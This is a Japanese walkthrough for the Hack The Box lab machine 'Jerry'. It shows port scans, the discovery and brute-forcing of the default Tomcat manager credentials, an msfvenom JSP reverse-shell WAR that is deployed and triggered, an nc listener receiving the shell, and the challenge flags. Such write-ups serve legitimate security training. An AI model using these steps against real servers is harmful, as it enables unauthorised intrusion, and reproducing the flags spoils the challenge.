https://app.hackthebox.com/machines/Jerry
## STEP 1
tcp8080番がオープン  
また、有効なデフォルトクレデンシャルを発見した
```sh
└─$ rustscan -a 10.129.136.9 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.136.9:8080
10.129.136.9 -> [8080]
```
```sh
└─$ nmap -n -Pn -p8080 -sV --script=http-default-accounts 10.129.136.9
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-25 10:47 EDT
Nmap scan report for 10.129.136.9
Host is up (0.32s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
| http-default-accounts: 
|   [Apache Tomcat] at /manager/html/
|_    tomcat:s3cret
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.50 seconds
```

## STEP 2
8080番にアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_01.png">
サイト右上の「manager app」をクリックするとbasic認証が要求される  
nmapの結果から確認できるデフォルトクレデンシャルでログインできた  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_02.png">  
いちお`burp suite`でもブルートフォースをやってみる  
basic認証を使用しているので、クレデンシャルがbase64でエンコードされてる  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_03.png">
burp suiteのproxyで確認できる通信を、intruderでいじる  
「payload configuration」にリストをpasteし、「payload proccessing」の「base64-encode」で各クレデンシャルをエンコード
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_04.png">  
「start attacks」で攻撃を開始すると、httpステータスコード200のクレデンシャルを確認できる  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_05.png">


## STEP 3
「manager app」にログイン  
warファイルをdeployできるので、war形式のペイロードをアップロードする  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_06.png">  
war形式のペイロード作成
```sh
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=tun0 LPORT=4444 -f war -o shell.war
Payload size: 1088 bytes
Final size of war file: 1088 bytes
Saved as: shell.war
```
ペイロードをデプロイ  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_07.png">  
デプロイしたペイロードが追加されていることがわかる  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Jerry_08.png">  
デプロイしたペイロードにhttpアクセスして、ペイロードを実行
```sh
└─$ curl http://10.129.136.91:8080/shell/
```
リバースシェル取得  
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.175] from (UNKNOWN) [10.129.136.9] 49153
Microsoft Windows [Version 6.3.9600
(c) 2013 Microsoft Corporation.  All rights reserved.

c:\apache-tomcat-7.0.88>cat 'C:\Users\administrator\desktop\flags\2 for the price of 1.txt'
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```
